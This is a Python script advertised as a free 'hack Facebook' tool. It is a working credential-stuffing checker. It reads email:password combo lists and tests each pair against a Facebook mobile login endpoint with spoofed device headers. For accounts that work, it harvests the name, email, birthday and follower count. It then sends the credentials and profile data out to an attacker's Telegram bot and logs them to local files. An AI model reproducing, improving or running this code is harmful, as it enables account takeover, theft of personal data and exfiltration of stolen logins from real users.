546887try:
	import os,sys,time,requests,json
	import random 
	from time import sleep
except ImportError:
	os.system('pip install requests')
	

#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
Q = "("
W = ")"
s=requests.Session()
#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= """ 
   \033[1;92m             
░░░░░░░░░░░░▄▄
░░░░░░░░░░░█░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░█░░░█
░░░░░░░░░█░░░░█
███████▄▄█░░░░░██████▄
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█████░░░░░░░░░█
██████▀░░░░▀▀██████▀

   \033[1;97m   
   \033[1;97m 
   \033[1;97m    
   \033[1;97m
   \033[1;92m       

\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
Tk = f""" {E}
 _     _ _______ _______ _     _
 |_____| |_____| |       |____/ 
 |     | |     | |_____  |    \_  {A} • {H} FACEBOOK
                                    
\033[1;91m < \033[1;93mTHE TOOL IS HACK FACEBOOK - FREE\033[1;91m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
 
"""
os.system('clear')

def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/EW2JedW4")
print (Sidra)
print ("\033[1;92mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password ⌯")
  os.system('xdg-open https://t.me/TT_RQ/1')
  sys.exit()
#----------------------------------------------------[Sidra_Cod_Checker]----------------------------------------------------#  
os.system('clear') 
class Sidra_Cod_Checker:
    def __init__(self):
        self.kun=[]
        self.sidraok = 0
        self.sidracp = 0
        self.sidrask = 0
        self.a =  random.randint(20000000.0, 30000000.0)
        self.b =  random.randint(20000.0, 40000.0)
        self.headers = {'x-fb-connection-bandwidth': repr(self.a),'x-fb-sim-hni': repr(self.b),'x-fb-net-hni': repr(self.b),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
        self.Sidra_Start()

    def Sidra_Start(self):
        #Cod BY : SidraELEzz
        #Telegram: https://t.me/SidraTools
        #Telegram: https://t.me/tt_rq	
        try:
            os.mkdir('Sidra')
        except: pass
        os.system('clear')
        print(Tk)
        try:
            os.mkdir('Sidra')
        except: pass
        print()
        fil= input(A+"("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
        token = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
        ID = input(A+"("+E+"⌯"+A+")"+H+ " Enter ID Tele :\n"+C)
        print("-"*50)
        file=open(fil,'r').read().splitlines()
        for i in file:
            self.kun.append(i)
        print()
        for x in self.kun:
            p=x.split(':')
            user=p[0]
            pw=p[1]
            #Cod BY : SidraELEzz
            #Telegram: https://t.me/SidraTools
            #Telegram: https://t.me/tt_rq
            self.Sidra_login(user,pw,ID,token)

    def Sidra_login(self,user,pw,ID,token):
        
        #Cod BY : SidraELEzz
        #Telegram: https://t.me/SidraTools
        #Telegram: https://t.me/tt_rq
        Sidracp = ("⌯ Hi Sidra Checkpoint 🔐 ⌯\n. — — — — —  — — — — — . \n\n.✥. Email 📧 : " +str(user)+"\n\n.✥. Pass 🔐 : " +str(pw)+"\n\n. — — — — —  — — — — — . \n.✥.Tele : @SidraTools")
        data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6",headers=self.headers).json()
        if "access_token" in data:
            
            self.sidraok+=1
            Tko = str(data['access_token'])
            idd = str(data['uid'])
            aww = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idd, Tko))
            x = json.loads(aww.text)
            try:
                username = x["name"]
            except (KeyError, IOError):
                username = "❌"
            except: pass
            try:
                date = x['birthday']
            except (KeyError, IOError):
                date = "❌"
            except: pass
            try:
                link = x['link']
            except (KeyError, IOError):
                link = "❌"
            except: pass
            try:
                email = x['email']
            except (KeyError, IOError):
                email = "❌"
                
            except: pass
            try:
                rx = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idd, Tko))
                zk = json.loads(rx.text)
                followers = zk['summary']['total_count']
            
            except (KeyError, IOError):
                followers = "❌"
            except: pass
            Sidraok = ("⌯ Hi Sidra Successful ✓ ⌯\n. — — — — —  — — — — — . \n\n.✥. Username : "+str(username)+"\n\n.✥. Email : "+str(email)+"\n\n.✥. followers : "+str(followers)+"\n\n.✥. ID : "+str(idd)+"\n\n.✥. Number : "+str(user)+"\n\n.✥. Pass : "+str(pw)+"\n\n.✥. date : "+str(date)+"\n. — — — — —  — — — — — .\n.• Link : "+str(link)+"\n. — — — — —  — — — — — .\n • Tele : @SidraTools ")
            print(E+Sidraok)
            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
            f=open('Sidra/Ok.txt','a')
            f.write(user+":"+pw+"\n")
            f.close()
            sleep(0.3)
        elif "www.facebook.com" in data["error_msg"]:
            self.sidracp+=1
            requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
            c=open('Sidra/CP.txt','a')
            c.write(user+":"+pw+"\n")
            c.close()
            
        else:
            
            
            self.sidrask+=1
            os.system('clear')
            print(Tk)
            print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
            print(A+"-----------------------------------")
            print("{}  Successful {} : {}{}".format(E,A,E,str(self.sidraok)))
            print("{}  Checkpoint {} : {}{}".format(H,A,H,str(self.sidracp)))
            print("{}  Start Check{} : {}{}{}".format(K,A,K,str(self.sidrask),C))
            print(A+"-----------------------------------")
            print(H+"Telegram  "+A+" : "+E+"@SidraTools")
            

#Cod BY : SidraELEzz
#Telegram: https://t.me/SidraTools
#Telegram: https://t.me/tt_rq           

Sidra_Cod_Checker()
print('\n[saved] Sidra/Ok.txt')
print('[saved] Sidra/CP.txt')
